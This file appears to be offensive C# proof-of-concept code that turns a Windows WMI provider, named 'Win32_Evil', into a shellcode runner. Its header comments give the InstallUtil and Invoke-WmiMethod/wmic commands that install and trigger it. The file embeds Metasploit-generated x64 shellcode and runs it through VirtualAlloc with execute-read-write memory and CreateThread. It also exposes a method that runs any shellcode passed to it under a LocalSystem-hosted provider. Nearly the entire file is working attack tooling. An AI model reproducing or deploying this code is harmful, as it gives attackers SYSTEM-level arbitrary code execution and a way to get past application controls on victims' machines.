// Based On LocalAdmin WMI Provider by Roger Zander
// http://myitforum.com/cs2/blogs/rzander/archive/2008/08/12/how-to-create-a-wmiprovider-with-c.aspx
// Adapted For Evil By @subTee
// Executes x64 ShellCode
// 
// Deliver and Install dll
// C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /i EvilWMIProvider.dll
// Invoke calc for SYSTEM level calculations
// Invoke-WmiMethod -Class Win32_Evil -Name ExecShellCalcCode
// Invoke-WmiMethod -Namespace root\cimv2 -Class Win32_Evil -Name ExecShellCode -ArgumentList @(0x90,0x90,0x90), $null
// Or... wmic.exe path win32_Evil
 
 
 
using System;
using System.IO;
using System.Collections;
using System.Management.Instrumentation;
using System.Management;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.EnterpriseServices.Internal;
 
 
[assembly: WmiConfiguration(@"root\cimv2", HostingModel = ManagementHostingModel.LocalSystem)] 
namespace EvilWMIProvider
{
    [System.ComponentModel.RunInstaller(true)]
    public class EvilInstall : DefaultManagementInstaller
    {
        public override void Install(IDictionary stateSaver)
        {
 
            new System.EnterpriseServices.Internal.Publish().GacInstall("EvilWMIProvider.dll");
            base.Install(stateSaver);
            System.Runtime.InteropServices.RegistrationServices RS = new System.Runtime.InteropServices.RegistrationServices();            
        }
 
        public override void Uninstall(IDictionary savedState)
        {
             
            try
            {
                ManagementClass MC = new ManagementClass(@"root\cimv2:Win32_Evil");
                MC.Delete();
            }
            catch { }
 
            try
            {
                base.Uninstall(savedState);
            }
            catch { }
        }
    }
 
    [ManagementEntity(Name = "Win32_Evil")]
    public class Evil
    {
        [ManagementKey]
        public string Member { get; set; }
 
         
        public Evil(string sMember)
        {
            Member = sMember;
            ExecShellCalcCode(); //Lauches ShellCode Not Necessary, Just here for Testing.
        }
 
         
        [ManagementEnumerator]
        static public IEnumerable DoEvil()
        {
                string sName = "Hello, World!";
                yield return new Evil(sName);
             
        }
 
        [ManagementTask]
        public static void ExecShellCalcCode()
        {
            // native function's compiled code
            // generated with metasploit
            // This is x64 Shellcode that start calc.exe
            // TODO: Experiment with x86 and x64 detection
            byte[] shellcode = new byte[272] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x00 };
 
 
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
 
 
            IntPtr pinfo = IntPtr.Zero;
 
            // execute native code
 
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
 
        }
 
        [ManagementTask]
        public static void ExecShellCode(byte[] sc)
        {
            // native function's compiled code
            // generated with metasploit
            // Takes Shellcode as an input parameter 
            // Invoke-WmiMethod -Class Win32_Evil -Name ExecShellCode -ArgumentList @(0x90, 0x90, 0x00), $null 
            // $null parameter required based on:
            // http://ss64.com/ps/invoke-wmimethod.html
 
            byte[] shellcode = sc;
 
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
 
 
            IntPtr pinfo = IntPtr.Zero;
 
            // execute native code
 
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
 
        }
 
 
        private static UInt32 MEM_COMMIT = 0x1000;
 
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
 
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
         UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
 
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
 
          );
 
 
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
 
          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
         
     
    }
 
}